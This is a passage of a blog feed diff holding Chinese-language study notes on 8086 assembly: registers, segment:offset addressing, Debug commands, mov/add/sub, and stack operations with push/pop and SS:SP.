-&lt;p&gt;&lt;strong&gt;字在寄存器中的存储&lt;/strong&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;数据：18
-二进制表示：10010
-在AX中：0（高位）000000000010010（低位）//可见，寄存器最大只能存储2^16-1
-写成16进制表示：0012H
-//H代表是十六进制，只有4个十六进制数（因为1个十六进制数对4个二进制数，即2^4=16）,也有0x0012的表示法
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;1 字就是 16bit,2byte（再次重申），现在 CPU 就是一次一字&lt;/p&gt;
-&lt;p&gt;汇编指令：&lt;/p&gt;
-&lt;p&gt;// 不区分大小写&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;mov ax,18   //把18送入ax寄存器中   即ax=18      mov:传送指令
-add ax,8    /将ax中的值加上8       即ax=ax+8
-mov ax,bx   //将bx中的数据送入a下   即ax=bx,注意是后面赋到前面
-add ax,bx   //将ax与bx中的相加，并存在ax中    即ax=ax+bx
-add ax,4E20H //什么进制都行，八进制前面加0，二进制最后加B，十进制都不加
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;add 可能导致上溢&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;add al,85H    //只加在了低8位，即后面的那俩，这时如果发生上溢，也是直接舍弃
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;CPU 给出物理地址的方法：&lt;/p&gt;
-&lt;p&gt;以 8086 为例:&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728214666879.png&#34; alt=&#34;1728214666879&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;8086 的地址总线是 20 位的，寻址能力 1M，但是寄存器是 16 位，寻址能力 64K，所以这里采用了将两个 16 位地址合成一个 20 位的物理地址的方法&lt;/p&gt;
-&lt;p&gt;地址加法器的原理：&lt;br /&gt;
-物理地址 = 段地址&lt;em&gt; 16（对于 16 进制就是左移 1 位，&lt;a href=&#34;%E8%BF%99%E6%97%B6%E5%B0%B1%E6%88%90%E4%BA%8620%E4%BD%8D&#34;&gt;二进制 4 位&lt;/a&gt;）+ 偏移地址&lt;/em&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;物理地址 = CS*16+IP&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728214968000.png&#34; alt=&#34;1728214968000&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;注：上图都是 16 进制&lt;/p&gt;
-&lt;p&gt;// 二进制每左移一位，这个数据（的十进制表示）*2。n 位就是 2^n。&lt;a href=&#34;x%E8%BF%9B%E5%88%B6%E5%B7%A6%E7%A7%BB%E4%B8%80%E4%BD%8D%EF%BC%8C%E5%B0%B1%E6%98%AF*x&#34;&gt;其他进制同理&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;段的概念&lt;/p&gt;
-&lt;p&gt;内存本身没有分段，分段实际上是 CPU 干的事，&lt;a href=&#34;%E5%9B%A0%E4%B8%BA8086%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E5%9C%B0%E5%9D%80%E6%80%BB%E7%BA%BF%E4%B8%8D%E4%B8%80%E6%A0%B7&#34;&gt;用于给出物理地址&lt;/a&gt;，这使得我们可以&lt;a href=&#34;%E5%B0%B1%E6%98%AFCPU%E5%B0%86%E5%86%85%E5%AD%98%E5%88%92%E5%88%86%E4%B8%BA%E5%87%A0%E4%B8%AA%E6%AE%B5%EF%BC%8C%E5%90%8C%E4%B8%80%E4%B8%AA%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%8F%AF%E4%BB%A5%E5%88%86%E4%B8%BA%E4%BB%BB%E6%84%8F%E6%95%B0%E9%87%8F%E7%9A%84%E6%AE%B5&#34;&gt;分段管理内存&lt;/a&gt;，偏移地址是 16 位，所以寻址能力为 64K，所以一个&lt;a href=&#34;%E4%B8%80%E4%B8%AA%E6%AE%B5%E7%9A%84%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%B0%B1%E6%98%AF%E4%BB%8E%E8%BF%99%E4%B8%AA%E6%AE%B5%E7%9A%84%E6%AE%B5%E5%9C%B0%E5%9D%80%E5%BC%80%E5%A7%8B%E7%9A%84%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80%E7%9A%84%E8%8C%83%E5%9B%B4&#34;&gt;段最大也就 64K&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;// 输出同一个物理地址，可以有许多组段地址和偏移地址&lt;/p&gt;
-&lt;p&gt;描述方法：数据在 21F6H 内存单元中 = 2000:1F60 单元中 = 在 2000 段的 1F60H 单元中&lt;/p&gt;
-&lt;p&gt;段寄存器&lt;/p&gt;
-&lt;p&gt;8086（x86）有 4 个段寄存器&lt;/p&gt;
-&lt;p&gt;[CS](code segment，就是用来存储段地址的),[DS](data segment),[SS](stack segment),[ES](extra segment),x64 会多 4 个，都是类似于 ES 的，不是专用&lt;/p&gt;
-&lt;p&gt;CS 和&lt;a href=&#34;%E6%8C%87%E4%BB%A4%E6%8C%87%E9%92%88%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%8C%E5%AE%9E%E9%99%85%E4%B8%8A%E5%B0%B1%E6%98%AF%E5%AD%98%E7%9A%84%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80&#34;&gt; IP&lt;/a&gt; 是最常用的&lt;/p&gt;
-&lt;p&gt;整个过程：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728218715382.png&#34; alt=&#34;1728218715382&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;注：IP 有个指令自加器，会自动加上指令长度&lt;/p&gt;
-&lt;p&gt;CS 与 IP 不能使用 mov 指令，要用 jmp (转移地址)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;jmp 2AE3:3   //也就是2AE30+00003=2AE33
-JMP 3:0B16   //也就是00030+00B16=00B46,汇编指令不区分大小写
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;代码段&lt;/p&gt;
-&lt;p&gt;将长度为 N (N&amp;lt;=64KB) 的一组大麦，存在一组地址连续，&lt;a href=&#34;%E5%9B%A0%E4%B8%BA%E6%AE%B5%E5%9C%B0%E5%9D%80%E8%A6%81%E4%B9%9816%EF%BC%8C%E4%B8%BA%E4%BA%86%E8%83%BD%E5%A4%9F%E8%A2%AB%E5%AE%9A%E4%BD%8D%E5%88%B0%EF%BC%8C%E8%B5%B7%E5%A7%8B%E5%BF%85%E9%A1%BB%E6%98%AF16%E7%9A%84%E5%80%8D%E6%95%B0&#34;&gt;起始地址为 16 的倍数&lt;/a&gt;的内存单元中，这就定义了一个代码段&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;只有 CS:IP 指定的代码段&lt;a href=&#34;%E5%85%B6%E5%AE%9E%E6%98%AF%E8%AF%BB%E5%8F%96%E6%8C%87%E4%BB%A4%E5%B9%B6%E5%B0%86%E5%AE%83%E6%94%BE%E5%85%A5%E6%8C%87%E4%BB%A4%E7%BC%93%E5%86%B2%E5%99%A8&#34;&gt;才会执行&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;Debug 程序&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728220891479.png&#34; alt=&#34;1728220891479&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;R 命令：这里实现了修改，这个可以修改 CS 和 IP&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728220973614.png&#34; alt=&#34;1728220973614&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;T 指令：会返回一个和 R 命令一样的查看（运行之后的）&lt;/p&gt;
-&lt;p&gt;D 指令：返回的是十六进制&lt;/p&gt;
-&lt;p&gt;E 命令：要使用机器指令的格式写操作&lt;/p&gt;
-&lt;p&gt;A 命令：-a 回车，接下来一条指令一执行&lt;/p&gt;
-&lt;p&gt;U 命令：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728221377761.png&#34; alt=&#34;1728221377761&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;退出输入 quit（事实上 q 开头就行）&lt;/p&gt;
-&lt;p&gt;内存访问&lt;/p&gt;
-&lt;p&gt;内存中&lt;a href=&#34;%E5%88%9A%E5%A5%BD%E4%BF%A9%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E6%95%B0%EF%BC%8C%E4%B8%80%E4%B8%AA%E5%AF%84%E5%AD%98%E5%99%A8%E5%AE%BD%E5%BA%A6%EF%BC%8C%E5%86%85%E5%AD%98%E4%B8%80%E4%B8%AA%E5%8D%95%E5%85%83%E5%B0%B1%E6%98%AF1%E5%AD%97%E8%8A%82&#34;&gt;字&lt;/a&gt;的存储&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728304242345.png&#34; alt=&#34;1728304242345&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;比如，上图中 1 地址单元存放的字型数据是 124EH&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;俩个连续的内存单元，n 和 n+1，可以看成两个单元，也可以看成 n 字单元（不是 n+1）的搞字节单元和低字节单元&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;DS (数据段寄存器)[address]  // 这是偏移地址&lt;/p&gt;
-&lt;p&gt;mov 指令有两种转送功能：&lt;br /&gt;
-1. 将数据直接送入寄存器&lt;/p&gt;
-&lt;p&gt;2. 将一个寄存器中的内容送入另一个寄存器&lt;/p&gt;
-&lt;p&gt;3.&lt;strong&gt; 将一个内存单元中的内容送入一个寄存器&lt;/strong&gt;&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;格式 ：mov al,[0]    // 寄存器名，[内存单元地址（偏移地址）]&lt;/p&gt;
-&lt;p&gt;一个单元 1 字节，所以用 al 而不是 ax, 如果用 ax，它会拉上它的高位组成一个字&lt;/p&gt;
-&lt;p&gt;此时的段地址就是 DS 里的地址，DS 寄存器不能直接送数据，必须经过通用寄存器（这是硬件设计的缘故）&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;写入内存前先要确定好段地址：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728305194634.png&#34; alt=&#34;1728305194634&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;mov,add,&lt;a href=&#34;%E5%87%8F&#34;&gt;sub&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;MOV 的所有格式：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;%E6%B1%87%E7%BC%96.assets/1728305663779.png&#34; alt=&#34;1728305663779&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;现在，mov 寄存器，段寄存器&lt;/p&gt;
-&lt;p&gt;也是可以的&lt;/p&gt;
-&lt;p&gt;add/sub 的所有格式：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728305871479.png&#34; alt=&#34;1728305871479&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;数据段&lt;/p&gt;
-&lt;p&gt;用 CS 指向的是代码段，其他寄存器指向的都是数据段，定义同代码段&lt;/p&gt;
-&lt;p&gt;栈&lt;/p&gt;
-&lt;p&gt;后进先出&lt;/p&gt;
-&lt;p&gt;CPU 提供的栈机制&lt;/p&gt;
-&lt;p&gt;向下增长说的是从&lt;strong&gt;高地址（栈底）&lt;/strong&gt;，向 ** 低地址（栈顶）** 增长，此时制图是上低下高&lt;/p&gt;
-&lt;p&gt;为了更形象表示后进先出的特性，会倒着画，此时栈底是真的在地下，高地址&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;但是数据还是高地址读到低地址&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;CPU 会提供相关指令来以栈的方式访问&lt;strong&gt;内存空间&lt;/strong&gt;，将一段&lt;strong&gt;内存&lt;/strong&gt;当作栈使用&lt;/p&gt;
-&lt;p&gt;push (入栈)，pop (出栈)&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;push ax //将ax中的数据送入栈中（一字，对于8086）
-pop ax //从栈顶取出数据放入ax（一字，对于8086）
-高地址高位，低地址低位，在栈上就是高地址在下面
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;SS：存放&lt;strong&gt;栈顶&lt;/strong&gt;的段寄存器      所有的段地址都不能直接写&lt;/p&gt;
-&lt;p&gt;SP：存放&lt;strong&gt;栈顶&lt;/strong&gt;的偏移地址&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;任何时候：SS:SP 指向栈顶&lt;/p&gt;
-&lt;p&gt;push 操作会&lt;strong&gt;先&lt;/strong&gt;使 SP=SP-2 这样又指向栈顶 (pop 同理，但是是&lt;strong&gt;后&lt;/strong&gt; +)&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;push 会先 - 2，靠近栈顶低地址，然后写入。&lt;/p&gt;
-&lt;p&gt;pop 会先读出数据，然后 + 2，靠近栈底高地址。&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;空栈时 SP 指向最高地址单元的&lt;strong&gt;下一个&lt;/strong&gt;单元（这个不在栈空间里）此时没有栈顶元素&lt;/p&gt;
-&lt;p&gt;（但是 SS 始终在栈的最高地址）&lt;/p&gt;
-&lt;p&gt;比如栈空间是 10000H~10000FH&lt;/p&gt;
-&lt;p&gt;那么对应的 SS 是 1000H，SP 是 0010H 而不是 000FH&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;栈顶超界问题&lt;/p&gt;
-&lt;p&gt;当满栈时继续 push，或者空栈时继续 pop，都会栈顶超界，&lt;a href=&#34;CPU%E5%8F%AA%E8%AE%B0%E5%BD%95%E6%A0%88%E9%A1%B6%EF%BC%8C%E6%A0%88%E7%A9%BA%E9%97%B4%E7%9A%84%E5%A4%A7%E5%B0%8F%E8%A6%81%E8%87%AA%E8%A1%8C%E7%AE%A1%E7%90%86%EF%BC%8Ccpu%E5%8F%AA%E4%BC%9A%E8%AE%A4%E5%BE%97SS:SP,%E4%B8%8D%E7%9F%A5%E9%81%93%E6%A0%88%E7%A9%BA%E9%97%B4&#34;&gt;写程序时不要超界&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;%E5%86%85%E5%AD%98%E4%BC%A0%E9%80%81%E6%8C%87%E4%BB%A4&#34;&gt;push，pop 指令&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;在寄存器和&lt;a href=&#34;%E6%A0%88%E7%A9%BA%E9%97%B4%E4%B9%9F%E6%98%AF%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86&#34;&gt;内存&lt;/a&gt;之间传送数据，可以直接操作 DS&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;push/pop [0] //可以用偏移地址，此时段地址是DS，不是SS，更不是CS
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;注意：&lt;/p&gt;
-&lt;p&gt;push/pop 修改的只是 SP, 不会修改 SS，所以栈顶只能是 0~FFFFH，最大 64K&lt;/p&gt;
-&lt;p&gt;用栈来暂存数据，&lt;strong&gt;出入栈顺序相反&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;比如：&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;...
-mov ax,001AH
-mov bx,001BH
-push ax
-push bx    //bx先进
-xor ax,ax
-//这是最简便的清零方法，也可以用sub ax,ax或mov ax,0。区别是mov整个句字占3个字节，但是sub只要2个字节
-xor bx,bx
-pop bx     //bx先出
-pop ax
-...
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;栈段&lt;/p&gt;
-&lt;p&gt;定义同数据段和代码段，&amp;lt;64K 的连续内存空间&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728996769095.png&#34; alt=&#34;1728996769095&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;栈实际上是人为定义的内存空间，CPU 不会认为 pop,push 的部分是栈（没有这个概念），也不知道空间是多大，你写到不是栈的地方也是可以的。（当然不能这么做，写的时候就要自己决定好大小不要写出去）&lt;/p&gt;
-&lt;p&gt;但是栈底要是再 pop，会回到最低单元（栈顶，实际上严格来讲不能这么说）也就是说，SS 不变，也就是只能在那 64K 的空间里环绕&lt;strong&gt;覆盖&lt;/strong&gt;&lt;/p&gt;
-</content>
-        <category term="技术" scheme="https://zhewanyiershinicheng.github.io/categories/%E6%8A%80%E6%9C%AF/" />
-        <category term="技术" scheme="https://zhewanyiershinicheng.github.io/tags/%E6%8A%80%E6%9C%AF/" />
         <updated>2024-10-11T09:48:50.000Z</updated>
     </entry>
 </feed>
